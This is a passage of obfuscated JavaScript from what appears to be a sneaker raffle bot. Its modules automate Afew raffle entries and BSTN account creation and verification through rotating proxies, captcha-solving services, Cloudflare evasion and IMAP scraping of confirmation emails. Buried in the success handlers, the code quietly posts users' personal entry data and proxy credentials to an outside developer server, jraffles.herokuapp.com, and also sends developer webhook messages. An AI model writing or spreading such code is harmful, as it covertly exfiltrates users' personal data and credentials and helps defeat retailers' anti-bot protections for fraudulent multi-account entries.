                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x9005ae = await _0xd499ac['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x205d6a[0x0] + ':' + _0x205d6a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x1576d5 = JSON['parse'](_0x3601e1['readFileSync']('sizes.json', 'utf-8')), _0x43c94e = _0x4e71f6[_0x25ec0d]['Url'], _0x442cce = _0x4e71f6[_0x25ec0d]['Size'], _0x52bc72;
                        async function _0x49f842() {
                            var _0x2ed0e0 = new _0x4d9dc6['CookieJar']();
                            console['log'](_0x24cf02() + '\x20[' + _0x53c2e4['name'] + ']\x20Task\x20' + (_0x25ec0d + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x3bbe51;
                            let _0x4dcea9 = {
                                'method': 'GET',
                                'cookieJar': _0x2ed0e0,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x205d6a[0x2] + ':' + _0x205d6a[0x3] + '@' + _0x205d6a[0x0] + ':' + _0x205d6a[0x1]
                            }, _0x4f465a = _0x43c94e['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x1f09f0 = _0x4f465a + '.json', _0x4985e6 = await _0x2c145d(_0x1f09f0);
                            console['log'](_0x24cf02() + '\x20[' + _0x53c2e4['name'] + ']\x20Task\x20' + (_0x25ec0d + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x54add2 = _0x4985e6['data']['product']['variants'];
                            if (_0x442cce != 'RANDOM') {
                                if (_0x54add2[0x1]['option1']['includes']('W')) {
                                    const _0x4e7516 = _0x1576d5['women']['find'](_0x4decf3 => _0x4decf3['EUsize'] === _0x442cce);
                                    _0x4e7516 && (_0x442cce = _0x4e7516['size']);
                                } else {
                                    if (_0x54add2[0x1]['option1']['includes']('Y')) {
                                        const _0x3e7822 = _0x1576d5['GS']['find'](_0x3232a2 => _0x3232a2['EUsize'] === _0x442cce);
                                        _0x3e7822 && (_0x442cce = _0x3e7822['size']);
                                    } else {
                                        const _0x3e4e38 = _0x1576d5['men']['find'](_0x161027 => _0x161027['EUsize'] === _0x442cce);
                                        _0x3e4e38 && (_0x442cce = _0x3e4e38['size']);
                                    }
                                }
                                for (var _0x2e8ead of _0x54add2) {
                                    _0x2e8ead['option1'] == _0x442cce && (_0x3bbe51 = _0x2e8ead['id']);
                                }
                            } else {
                                var _0x477fe2 = Math['round'](Math['random']() * (_0x54add2['length'] - 0x1));
                                _0x3bbe51 = _0x54add2[_0x477fe2]['id'];
                            }
                            console['log'](_0x24cf02() + '\x20[' + _0x53c2e4['name'] + ']\x20Task\x20' + (_0x25ec0d + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x2c145d('https://raffles.afew-store.com/cart/' + _0x3bbe51 + ':1'), _0x52bc72 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x49f842();
                        } catch (_0xb2d029) {
                            if (_0xb2d029['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0xb2d029);
                        }
                        const _0x337a8e = await _0x9005ae['newPage']();
                        await _0x337a8e['setDefaultNavigationTimeout'](0x1d4c0), await _0x337a8e['authenticate']({
                            'username': '' + _0x205d6a[0x2],
                            'password': '' + _0x205d6a[0x3]
                        }), await _0x337a8e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x337a8e['setRequestInterception'](!![]), _0x337a8e['on']('request', _0x52acbe => {
                            _0x52acbe['resourceType']() === 'image' || _0x52acbe['resourceType']() === 'font' || _0x52acbe['resourceType']() === 'media' ? _0x52acbe['abort']() : _0x52acbe['continue']();
                        });
                        try {
                            await _0x337a8e['goto'](_0x52bc72, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x24cf02() + '\x20[' + _0x53c2e4['name'] + ']\x20Task\x20' + (_0x25ec0d + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x337a8e['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x337a8e['type']('#checkout_email', '' + _0x4e71f6[_0x25ec0d]['Email']), await _0x1d2efb(0x320), await _0x337a8e['type']('#checkout_attributes_instagram', '' + _0x4e71f6[_0x25ec0d]['Follower']), await _0x1d2efb(0x320), await _0x337a8e['select']('#checkout_shipping_address_country', '' + _0x4e71f6[_0x25ec0d]['Country']), await _0x337a8e['waitForTimeout'](0x258), await _0x337a8e['type']('#checkout_shipping_address_first_name', '' + _0x4e71f6[_0x25ec0d]['FirstName']), await _0x337a8e['waitForTimeout'](0x320), await _0x337a8e['type']('#checkout_shipping_address_last_name', '' + _0x4e71f6[_0x25ec0d]['LastName']), await _0x337a8e['waitForTimeout'](0x2bc), await _0x337a8e['type']('#checkout_shipping_address_address1', _0x4e71f6[_0x25ec0d]['Address1'] + '\x20' + _0x4e71f6[_0x25ec0d]['HouseNumber']), await _0x337a8e['waitForTimeout'](0x2bc), await _0x337a8e['type']('#checkout_shipping_address_address2', '' + _0x4e71f6[_0x25ec0d]['Address2']), await _0x337a8e['waitForTimeout'](0x2bc), await _0x337a8e['type']('#checkout_shipping_address_zip', '' + _0x4e71f6[_0x25ec0d]['Zip']), await _0x337a8e['waitForTimeout'](0x2bc), await _0x337a8e['type']('#checkout_shipping_address_city', '' + _0x4e71f6[_0x25ec0d]['City']), await _0x337a8e['waitForTimeout'](0x2bc);
                        if (_0x4e71f6[_0x25ec0d]['State'] != '')
                            try {
                                const _0x2dd963 = JSON['parse'](_0x3601e1['readFileSync']('States.json', 'utf8'));
                                await _0x1d2efb(0x1f4);
                                if (_0x4e71f6[_0x25ec0d]['State']['length'] > 0x2)
                                    for (let _0x3cf53f of _0x2dd963) {
                                        if (_0x3cf53f['Province'] == _0x4e71f6[_0x25ec0d]['State']) {
                                            await _0x337a8e['select']('#checkout_shipping_address_province', _0x3cf53f['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x337a8e['select']('#checkout_shipping_address_province', _0x4e71f6[_0x25ec0d]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x1d2efb(0x1f4), console['log'](_0x24cf02() + '\x20[' + _0x53c2e4['name'] + ']\x20Task\x20' + (_0x25ec0d + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x1d2efb(0x190), _0x337a8e['evaluate'](() => {
                            const _0x3af3e6 = document['querySelector']('#continue_button');
                            for (var _0x6acd16 = 0x0; _0x6acd16 < 0x5; _0x6acd16++) {
                                if (_0x3af3e6) {
                                    _0x3af3e6['click'](), _0x3af3e6['click']();
                                    break;
                                } else
                                    _0x1d2efb(0xfa0);
                            }
                        }), await _0x337a8e['waitForTimeout'](0x9c4);
                        try {
                            await _0x337a8e['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x337a8e['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x24b75d => _0x24b75d['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x337a8e['waitForTimeout'](0x7d0), console['log'](_0x24cf02() + '\x20[' + _0x53c2e4['name'] + ']\x20Task\x20' + (_0x25ec0d + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x337a8e['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x1d2efb(0x3e8), await _0x337a8e['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0xc5c43b => _0xc5c43b['submit']()), await _0x1d2efb(0x3e8);
                        try {
                            await _0x337a8e['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x337a8e['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x11e431 => _0x11e431['submit']());
                        try {
                            await _0x337a8e['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x34649c = 'no', _0x21396e(_0x4e71f6[_0x25ec0d], _0x53c2e4), console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x53c2e4['name'] + ']\x20Task\x20' + (_0x25ec0d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '')
                                try {
                                    await _0x471d59(_0x6a12f3['webhook'], _0x5359aa['succesDEVMSG']);
                                } catch {
                                }
                            await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x5359aa['succesDEVMSG']), await _0x1d2efb(0xc8);
                            try {
                                await _0x471d59(_0x1d6d5c, _0x5359aa['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x3919f0['replace']('#', ''),
                                    'module': _0x53c2e4['name'],
                                    'entrydata': JSON['stringify'](_0x48d7f1),
                                    'proxy': '' + _0x4cf87e[_0x25ec0d]
                                };
                                var _0x51004d = JSON['stringify'](prxdata);
                                let _0x4353dc = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x51004d, _0x4353dc);
                            } catch (_0x323511) {
                            }
                        } catch (_0x4caa91) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x5e079b) {
                        _0x5e079b['message']['includes']('selector') && (_0x5e079b = 'Connection\x20Error');
                        console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x53c2e4['name'] + ']\x20Task\x20' + (_0x25ec0d + 0x1) + '\x20:\x20' + _0x5e079b)), _0x589496 = '' + _0x5e079b;
                        var _0x313b67 = await _0x3aa619(_0x4e71f6[_0x25ec0d], _0x53c2e4, 'dev', !![], _0x589496);
                        _0x5359aa['errorDEV'] = { 'embeds': [_0x313b67] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x5359aa['errorDEV']), await _0x471d59(_0x32fdb9, _0x5359aa['errorDEV']), _0x34649c = 'yes';
                    } finally {
                        _0x9005ae && _0x9005ae['close']();
                        if (_0x34649c == 'yes' && _0x52754b != 0x5 && _0x589496 != 'Size\x20Not\x20Found') {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x53c2e4['name'] + ']\x20Task\x20' + (_0x25ec0d + 0x1) + '\x20:\x20Retrying\x20(' + _0x52754b + '\x20/\x205)')), _0x25ec0d = _0x25ec0d - 0x1, _0x52754b = _0x52754b + 0x1;
                            continue;
                        }
                        _0x34649c == 'yes' && _0x52754b >= 0x5 && (_0x12ac99(_0x4e71f6[_0x25ec0d], _0x53c2e4), _0x34649c = 'no', _0x52754b = 0x0);
                        if (_0x25ec0d + 0x1 == _0x4e71f6['length']) {
                            await _0x1d2efb(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x6a12f3['AfewDelay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4416fd, _0x6cdf7f, _0x467a96) {
                    var _0x438d77 = _0x6cdf7f, _0x1204aa = 0x0;
                    for (var _0x18a117 = 0x0; _0x18a117 < _0x6cdf7f['length']; _0x18a117++) {
                        maxTasks = Number(_0x6a12f3['threads']);
                        while (_0x1204aa >= maxTasks) {
                            await _0x1d2efb(_0x6a12f3['delay']);
                        }
                        async function _0x4b9626(_0x29124f, _0x5b9383, _0x52c796, _0x416f74, _0x4883bd) {
                            _0x1204aa++, _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x6a12f3['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x464367;
                            try {
                                await _0x3cf8c0(_0x5b9383, _0x416f74);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0xd208b3(_0x29124f['name'] + '\x20Task\x20' + (_0x416f74 + 0x1) + '\x20/\x20' + _0x5b9383['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                            var _0x243cbd = await _0x3aa619(_0x5b9383[_0x416f74], _0x29124f, 'acc', ![]);
                            const _0x36c784 = { 'succesDEVMSG': { 'embeds': [_0x243cbd] } }, _0x5aa66c = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x75cd7f = Math['round'](Math['random']() * (_0x52c796['length'] - 0x1)), _0x4881dd = _0x52c796[_0x75cd7f]['split'](':'), _0xab5b1c;
                            try {
                                _0xab5b1c = await _0xd499ac['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x4881dd[0x0] + ':' + _0x4881dd[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0xab5b1c = await _0xd499ac['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x4881dd[0x0] + ':' + _0x4881dd[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x5a3b8b = await _0xab5b1c['newPage']();
                                await _0x5a3b8b['authenticate']({
                                    'username': '' + _0x4881dd[0x2],
                                    'password': '' + _0x4881dd[0x3]
                                }), console['log'](_0x24cf02() + '\x20[' + _0x29124f['name'] + ']\x20Task\x20' + (_0x416f74 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a3b8b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5a3b8b['setRequestInterception'](!![]), _0x5a3b8b['on']('request', _0x490ed6 => {
                                    _0x490ed6['resourceType']() === 'image' ? _0x490ed6['abort']() : _0x490ed6['continue']();
                                });
                                try {
                                    await _0x5a3b8b['goto']('' + _0x5aa66c), await _0x5a3b8b['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    retry = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x5a3b8b['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x24cf02() + '\x20[' + _0x29124f['name'] + ']\x20Task\x20' + (_0x416f74 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x1d2efb(0x7d0), console['log'](_0x24cf02() + '\x20[' + _0x29124f['name'] + ']\x20Task\x20' + (_0x416f74 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x1d2efb(0x190), await _0x5a3b8b['waitForSelector']('#firstname'), await _0x5a3b8b['focus']('#firstname'), await _0x5a3b8b['keyboard']['down']('Control'), await _0x5a3b8b['keyboard']['press']('A'), await _0x1d2efb(0xc8), await _0x5a3b8b['keyboard']['up']('Control'), await _0x5a3b8b['keyboard']['press']('Backspace'), await _0x5a3b8b['type']('#firstname', _0x5b9383[_0x416f74]['FirstName'], { 'delay': 0xf0 }), await _0x1d2efb(0x190), await _0x5a3b8b['focus']('#lastname'), await _0x5a3b8b['keyboard']['down']('Control'), await _0x5a3b8b['keyboard']['press']('A'), await _0x1d2efb(0xc8), await _0x5a3b8b['keyboard']['up']('Control'), await _0x5a3b8b['keyboard']['press']('Backspace'), await _0x5a3b8b['type']('#lastname', _0x5b9383[_0x416f74]['LastName'], { 'delay': 0xe6 }), await _0x1d2efb(0x190), await _0x5a3b8b['focus']('#email_address'), await _0x5a3b8b['keyboard']['down']('Control'), await _0x5a3b8b['keyboard']['press']('A'), await _0x1d2efb(0xc8), await _0x5a3b8b['keyboard']['up']('Control'), await _0x5a3b8b['keyboard']['press']('Backspace'), await _0x5a3b8b['type']('#email_address', _0x5b9383[_0x416f74]['Email'], { 'delay': 0x122 }), await _0x1d2efb(0x190), await _0x5a3b8b['type']('#password', _0x5b9383[_0x416f74]['Password'], { 'delay': 0x82 }), await _0x1d2efb(0x1f4), await _0x5a3b8b['type']('#password-confirmation', _0x5b9383[_0x416f74]['Password'], { 'delay': 0x7c }), console['log'](_0x24cf02() + '\x20[' + _0x29124f['name'] + ']\x20Task\x20' + (_0x416f74 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x1d2efb(0x2bc), await _0x5a3b8b['$eval']('#form-validate', _0x116241 => _0x116241['submit']()), await _0x1d2efb(0x1388);
                                const _0x3bcc55 = await _0x5a3b8b['$']('#email_address-error');
                                if (_0x3bcc55)
                                    throw new Error('Invalid\x20Email');
                                const _0x6f9510 = await _0x5a3b8b['$']('#password-error');
                                if (_0x6f9510)
                                    throw new Error('Invalid\x20Password');
                                await _0x5a3b8b['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x29124f['name'] + ']\x20Task\x20' + (_0x416f74 + 0x1) + '\x20:\x20Account\x20' + _0x5b9383[_0x416f74]['Email'] + '\x20Generated')), _0x3601e1['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x5b9383[_0x416f74]['Email'] + ',' + _0x5b9383[_0x416f74]['Password']);
                                try {
                                    _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x36c784['succesDEVMSG']);
                                } catch {
                                }
                                await _0x471d59(_0x70ae37, _0x36c784['succesDEVMSG']);
                                let _0x3f2401 = _0x5b9383[_0x416f74];
                                try {
                                    prxdata = {
                                        'username': _0x3919f0['replace']('#', ''),
                                        'module': _0x29124f['name'],
                                        'entrydata': JSON['stringify'](_0x3f2401),
                                        'proxy': '' + _0x52c796[_0x416f74]
                                    };
                                    var _0x367f27 = JSON['stringify'](prxdata);
                                    let _0x6741df = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x367f27, _0x6741df);
                                } catch (_0x31ab62) {
                                }
                                console['log'](_0x1b5f76['yellow'](_0x24cf02() + '\x20[' + _0x29124f['name'] + ']\x20Task\x20' + (_0x416f74 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x55e7df) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x29124f['name'] + ']\x20Task\x20' + (_0x416f74 + 0x1) + '\x20:\x20' + _0x55e7df)), _0x464367 = '' + _0x55e7df;
                                var _0x4af37d = await _0x3aa619(_0x5b9383[_0x416f74], _0x29124f, 'acc', !![], _0x464367);
                                _0x36c784['errorDEV'] = { 'embeds': [_0x4af37d] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x36c784['errorDEV']), await _0x471d59(_0x32fdb9, _0x36c784['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0xab5b1c)
                                    _0xab5b1c['close']();
                                if (retry == 'yes' && _0x4883bd != 0x5)
                                    return console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x29124f['name'] + ']\x20Task\x20' + (_0x416f74 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x4883bd + 0x1) + '\x20/\x205)')), _0x1204aa--, _0x4883bd = _0x4883bd + 0x1, _0x4b9626(_0x29124f, _0x5b9383, _0x52c796, _0x416f74, _0x4883bd);
                                retry == 'yes' && _0x4883bd >= 0x5 && (_0x12ac99(_0x5b9383[_0x416f74], _0x29124f), retry = 'no', _0x4883bd = 0x0), _0x1204aa--, console['log'](_0x24cf02() + '\x20[' + _0x29124f['name'] + ']\x20Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                            }
                        }
                        _0x4b9626(_0x4416fd, _0x438d77, _0x467a96, _0x18a117, 0x0), await _0x1d2efb(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x1ecd57, _0x321fcf) {
                    var _0x2438c1 = ![], _0x12a5a9 = [], _0x2b8e68 = 0x0;
                    async function _0x51157e() {
                        var _0x20f68c = new _0x2fec54({
                            'user': _0x6a12f3['masterMail'],
                            'password': _0x6a12f3['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2ad53d(_0x23db7e) {
                            _0x20f68c['openBox']('INBOX', ![], _0x23db7e);
                        }
                        _0x20f68c['once']('ready', function () {
                            _0x2ad53d(function (_0x348313, _0x5ad3b7) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x348313)
                                    throw _0x348313;
                                _0x20f68c['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x14ea35, _0x3db012) {
                                    if (!_0x3db012 || !_0x3db012['length'])
                                        console['log'](_0x24cf02() + '\x20[' + _0x1ecd57['name'] + ']\x20No\x20mails\x20found'), _0x20f68c['end']();
                                    else {
                                        var _0x32d180 = _0x20f68c['seq']['fetch'](_0x3db012, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x32d180['on']('message', function (_0x119b36, _0x2ca8fa) {
                                            var _0x270ca1 = '(#' + _0x2ca8fa + ')\x20';
                                            _0x119b36['on']('body', function (_0x34e491, _0x105fd4) {
                                                _0xe064d3(_0x34e491, (_0x5c773b, _0x185956) => {
                                                    var _0x29e07d = _0x185956['text']['split']('customer/account/confirm/')[0x1], _0xaeafa4 = _0x29e07d['split'](']')[0x0];
                                                    _0x12a5a9['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0xaeafa4);
                                                });
                                            }), _0x119b36['once']('end', function () {
                                            });
                                        }), _0x32d180['once']('error', function (_0x53c9bc) {
                                            console['log']('Fetch\x20error:\x20' + _0x53c9bc), _0x2438c1 = !![];
                                        }), _0x32d180['once']('end', function () {
                                            _0x20f68c['end'](), _0x2438c1 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x20f68c['once']('error', function (_0x34df3e) {
                            console['log'](_0x1b5f76['red'](_0x34df3e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2438c1 = !![];
                        }), _0x20f68c['once']('end', async function () {
                            _0x2438c1 = !![];
                        }), _0x20f68c['connect']();
                    }
                    try {
                        _0x51157e();
                        while (!_0x2438c1) {
                            await _0x1d2efb(0xfa0);
                        }
                        console['log']('Found\x20' + _0x12a5a9['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x1d2efb(0x7d0);
                    }
                    for (var _0x5b68e6 = 0x0; _0x5b68e6 < _0x12a5a9['length']; _0x5b68e6++) {
                        maxTasks = Number(_0x6a12f3['threads']);
                        while (_0x2b8e68 >= maxTasks) {
                            await _0x1d2efb(_0x6a12f3['delay']);
                        }
                        async function _0x3d9653(_0x261727, _0x42cbf5, _0x28c3b7, _0x4d9b87, _0x90ee2a) {
                            _0x2b8e68++, _0xd499ac['use'](_0x3295ba());
                            if (_0x2c6deb != 'yes')
                                var _0x2c6deb = '', _0x90ee2a = 0x0;
                            var _0x6f1ac7 = Math['round'](Math['random']() * (_0x28c3b7['length'] - 0x1)), _0x212881 = _0x28c3b7[_0x6f1ac7]['split'](':'), _0x41cdc4;
                            try {
                                _0x41cdc4 = await _0xd499ac['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x212881[0x0] + ':' + _0x212881[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x41cdc4 = await _0xd499ac['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x212881[0x0] + ':' + _0x212881[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x310323 = await _0x41cdc4['newPage']();
                                await _0x310323['authenticate']({
                                    'username': '' + _0x212881[0x2],
                                    'password': '' + _0x212881[0x3]
                                }), console['log'](_0x24cf02() + '\x20[' + _0x261727['name'] + ']\x20Task\x20' + (_0x4d9b87 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x310323['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x310323['setRequestInterception'](!![]), _0x310323['on']('request', _0x1e4b53 => {
                                    _0x1e4b53['resourceType']() === 'image' || _0x1e4b53['resourceType']() === 'font' || _0x1e4b53['resourceType']() === 'media' ? _0x1e4b53['abort']() : _0x1e4b53['continue']();
                                }), console['log'](_0x24cf02() + '\x20[' + _0x261727['name'] + ']\x20Task\x20' + (_0x4d9b87 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x310323['goto'](_0x42cbf5[_0x4d9b87]);
                                } catch (_0x4a88e9) {
                                    _0x2c6deb = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x4a88e9);
                                }
                                console['log'](_0x24cf02() + '\x20[' + _0x261727['name'] + ']\x20Task\x20' + (_0x4d9b87 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x310323['waitForTimeout'](0xbb8);
                                try {
                                    await _0x310323['waitForSelector']('.account-nav'), _0x2c6deb = 'no', console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x261727['name'] + ']\x20Task\x20' + (_0x4d9b87 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x17b331 = await _0x3aa619(null, _0x261727, 'ver', ![]);
                                    const _0x14adc3 = { 'succesDEVMSG': { 'embeds': [_0x17b331] } };
                                    await _0x471d59(_0xa6dcbb, _0x14adc3['succesDEVMSG']);
                                } catch {
                                    _0x2c6deb = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x3b9fad) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x261727['name'] + ']\x20Task\x20' + (_0x4d9b87 + 0x1) + '\x20:\x20' + _0x3b9fad));
                                var _0xb63d81 = _0x3b9fad, _0x236d68 = await _0x3aa619(null, _0x261727, 'ver', !![], _0xb63d81);
                                const _0x5e0654 = { 'errorDEVMSG': { 'embeds': [_0x236d68] } };
                                _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x5e0654['errorDEVMSG']), await _0x471d59(_0x32fdb9, _0x5e0654['errorDEVMSG']);
                            } finally {
                                _0x41cdc4['close']();
                                if (_0x2c6deb == 'yes' && _0x90ee2a != 0x5)
                                    return console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x261727['name'] + ']\x20Task\x20' + (_0x4d9b87 + 0x1) + '\x20:\x20Retrying\x20(' + _0x90ee2a + '\x20/\x205)')), _0x2b8e68--, _0x90ee2a = _0x90ee2a + 0x1, _0x3d9653(_0x261727, _0x42cbf5, _0x28c3b7, _0x4d9b87, _0x90ee2a);
